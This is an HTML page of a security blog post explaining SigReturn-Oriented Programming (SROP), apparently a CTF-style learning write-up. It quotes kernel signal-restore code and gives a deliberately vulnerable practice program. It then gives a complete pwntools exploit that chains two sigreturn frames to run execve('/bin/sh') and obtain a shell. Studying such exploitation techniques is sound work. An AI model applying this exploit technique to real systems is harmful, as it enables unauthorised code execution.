@@ -1,0 +1,217 @@
+<!doctype html>
+<html lang="en" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE] SROP · whrds.log</title><meta name="description" content="※ If there are any mistakes, please let us know. We will check and correct it. ※ SROP (SigReturn-Oriented Programming) is a ROP technique that uses the sigreturn syscall. In the process of processing signals, interaction between user mode and kernel mode occurs. This process is called context switching. you">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/en/posts/pwnable-srop/">
+  <link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-srop/"><link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-srop/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE] SROP · whrds.log"><meta property="og:description" content="※ If there are any mistakes, please let us know. We will check and correct it. ※ SROP (SigReturn-Oriented Programming) is a ROP technique that uses the sigreturn syscall. In the process of processing signals, interaction between user mode and kernel mode occurs. This process is called context switching. you"><meta property="og:url" content="https://whrds.github.io/en/posts/pwnable-srop/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE] SROP","description":"※ If there are any mistakes, please let us know. We will check and correct it. ※ SROP (SigReturn-Oriented Programming) is a ROP technique that uses the sigreturn syscall. In the process of processing signals, interaction between user mode and kernel mode occurs. This process is called context switching. you","datePublished":"2024-05-02","inLanguage":"en","url":"https://whrds.github.io/en/posts/pwnable-srop/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">Skip to content</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/en/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="Main navigation">
+      <a href="/en/" aria-current="page">Notes</a>
+      <a href="/en/about/">About</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="/ko/posts/pwnable-srop/" class="" lang="ko">KO</a>
+        <a href="#" class="active" lang="en" aria-current="true">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE] SROP</h1><p class="article-description">※ If there are any mistakes, please let us know. We will check and correct it. ※ SROP (SigReturn-Oriented Programming) is a ROP technique that uses the sigreturn syscall. In the process of processing signals, interaction between user mode and kernel mode occurs. This process is called context switching. you</p><div class="article-meta"><time datetime="2024-05-02">May 2, 2024</time><span>·</span><span>2 min read</span></div></header><div class="prose"><p><strong>※ If there are any mistakes, please let me know. We will check and correct it. <strong>※</strong></strong> </p>
+<p>SROP (SigReturn-Oriented Programming) is a ROP technique that uses the sigreturn syscall.</p>
+<p>In the process of processing signals, interaction between user mode &lt;-&gt; kernel mode occurs.</p>
+<p>This process is called context switching.</p>
+<p>When switching from user mode to kernel mode, information including existing register values ​​must be maintained so that the next functions can be continued even after returning. </p>
+<p>At this time, the function that restores the value is restore_sigcontext.</p>
+<pre><code>static bool restore_sigcontext(struct pt_regs *regs,
+			       struct sigcontext __user *usc,
+			       unsigned long uc_flags)
+{
+	struct sigcontext sc;
+	/* Always make any pending restarted system calls return -EINTR */
+	current-&gt;restart_block.fn = do_no_restart_syscall;
+	if (copy_from_user(&amp;sc, usc, CONTEXT_COPY_SIZE))
+		return false;
+#ifdef CONFIG_X86_32
+	set_user_gs(regs, sc.gs);
+	regs-&gt;fs = sc.fs;
+	regs-&gt;es = sc.es;
+	regs-&gt;ds = sc.ds;
+#endif /* CONFIG_X86_32 */
+	regs-&gt;bx = sc.bx;
+	regs-&gt;cx = sc.cx;
+	regs-&gt;dx = sc.dx;
+	regs-&gt;si = sc.si;
+	regs-&gt;di = sc.di;
+	regs-&gt;bp = sc.bp;
+	regs-&gt;ax = sc.ax;
+	regs-&gt;sp = sc.sp;
+	regs-&gt;ip = sc.ip;
+#ifdef CONFIG_X86_64
+	regs-&gt;r8 = sc.r8;
+	regs-&gt;r9 = sc.r9;
+	regs-&gt;r10 = sc.r10;
+	regs-&gt;r11 = sc.r11;
+	regs-&gt;r12 = sc.r12;
+	regs-&gt;r13 = sc.r13;
+	regs-&gt;r14 = sc.r14;
+	regs-&gt;r15 = sc.r15;
+#endif /* CONFIG_X86_64 */
+	/* Get CS/SS and force CPL3 */
+	regs-&gt;cs = sc.cs | 0x03;
+	regs-&gt;ss = sc.ss | 0x03;
+	regs-&gt;flags = (regs-&gt;flags &amp; ~FIX_EFLAGS) | (sc.flags &amp; FIX_EFLAGS);
+	/* disable syscall checks */
+	regs-&gt;orig_ax = -1;
+#ifdef CONFIG_X86_64
+	/*
+	 * Fix up SS if needed for the benefit of old DOSEMU and
+	 * CRIU.
+	 */
+	if (unlikely(!(uc_flags &amp; UC_STRICT_RESTORE_SS) &amp;&amp; user_64bit_mode(regs)))
+		force_valid_ss(regs);
+#endif
+	return fpu__restore_sig((void __user *)sc.fpstate,
+			       IS_ENABLED(CONFIG_X86_32));
+}
+</code></pre>
+<p>The code is that of restore_sigcontext().</p>
+<p>If you look at the code above, the information of each register and stack is copied and stored and set again when returning.</p>
+<p>The rescue vehicle referred to at this time is sigcontext.</p>
+<pre><code>/* __x86_64__: */
+struct sigcontext {
+  __u64               r8;
+  __u64               r9;
+  __u64               r10;
+  __u64               r11;
+  __u64               r12;
+  __u64               r13;
+  __u64               r14;
+  __u64               r15;
+  __u64               rdi;
+  __u64               rsi;
+  __u64               rbp;
+  __u64               rbx;
+  __u64               rdx;
+  __u64               rax;
+  __u64               rcx;
+  __u64               rsp;
+  __u64               rip;
+  __u64               eflags;     /* RFLAGS */
+  __u16               cs;
+  __u16               gs;
+  __u16               fs;
+  union {
+      __u16           ss; /* If UC_SIGCONTEXT_SS */
+      __u16           __pad0; /* Alias name for old (!UC_SIGCONTEXT_SS) user-space */
+  };
+  __u64               err;
+  __u64               trapno;
+  __u64               oldmask;
+  __u64               cr2;
+  struct _fpstate __user      *fpstate;   /* Zero when no FPU context */
+#  ifdef __ILP32__
+  __u32               __fpstate_pad;
+#  endif
+  __u64               reserved1[8];
+};
+</code></pre>
+<p>If you look at it this way, you may immediately understand what it means, but most likely you won’t.</p>
+<pre><code>#include &lt;unistd.h&gt;
+
+int gift() {
+  asm(&quot;pop %rax;&quot;
+      &quot;syscall;&quot;
+      &quot;ret&quot; );
+}
+
+int main()
+{
+  printf(&quot;hello ZZoMb1E!\n&quot;);
+  char buf[16];
+  read(0, buf ,1000);
+  
+  return 0;
+}
+</code></pre>
+<p>If you look at the given code, it provides an overflow vulnerability and a function for syscall.</p>
+<p>The rax of the function that generates the signal is 0xf, so you can use this to generate an alarm and modulate it.</p>
+<p>I looked at various blogs, including Dream Hack, and Dream Hack uses a function called SigreturnFrame().</p>
+<p>Using this function, you can enter values ​​only for the desired elements of the sigcontext structure.</p>
+<p>First, the bss area must be set as a new stack and the value must be input.</p>
+<p>Setting the register to perform the above function is as follows.</p>
+<pre><code>sigframe.rsp = bss
+sigframe.rax = 0x0
+sigframe.rdi = 0x0
+sigframe.rsi = bss
+sigframe.rdx = 0x1000
+sigframe.rip = syscall
+</code></pre>
+<p>Afterwards, execve(“/bin/sh”,0,0) must be implemented with the entered value.</p>
+<pre><code>sig2.rax = 0x3b
+sig2.rip = syscall
+sig2.rsi = 0x0
+sig2.rdi = bss + 0x108
+sig2.rdx = 0x0
+</code></pre>
+<p>The code for that part is as above.</p>
+<p>The reason why bss+0x108 is given at this time is because the length of SigreturnFrame() is 0xf8.</p>
+<p>This is because syscall and 0x0 are entered here, and a total of 0x108 buffer is entered before the /bin/sh/ string.</p>
+<p><img src="/assets/images/tistory/tistory-b274056796bb/001.png" alt=""></p>
+<p>If you write the above value as a payload and send it, you can see the stack changing as shown below.</p>
+<p><img src="/assets/images/tistory/tistory-b274056796bb/002.png" alt=""></p>
+<pre><code>from pwn import*
+
+context.arch = 'x86_64'
+
+p = process(&quot;./srop&quot;)
+e = ELF(&quot;./srop&quot;)
+
+gadget = next(e.search(asm('pop rax; syscall')))
+syscall = next(e.search(asm('syscall')))
+bss = e.bss()
+
+sigframe = SigreturnFrame()
+
+sigframe.rsp = bss
+sigframe.rax = 0x0
+sigframe.rdi = 0x0
+sigframe.rsi = bss
+sigframe.rdx = 0x1000
+sigframe.rip = syscall
+
+payload = b'a'*0x10
+payload += b'b'*0x8
+payload += p64(gadget)
+payload += p64(0xf)
+payload += bytes(sigframe)
+p.sendline(payload)
+
+sig2 = SigreturnFrame()
+
+sig2.rax = 0x3b
+sig2.rip = syscall
+sig2.rsi = 0x0
+sig2.rdi = bss + 0x108
+sig2.rdx = 0x0
+
+payload = p64(gadget)
+payload += p64(0xf)
+payload += bytes(sig2)
+payload += b&quot;/bin/sh\x00&quot;
+
+p.sendline(payload)
+</code></pre>
+<p>If you run it, you can see that the shell has been obtained normally as shown below.</p>
+<p><img src="/assets/images/tistory/tistory-b274056796bb/003.png" alt=""></p>
+</div><div class="article-end"><a href="/en/">← View all notes</a><a href="/ko/posts/pwnable-srop/" hreflang="ko">Read this post in Korean →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>Observe, verify, document.</span><a href="/en/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
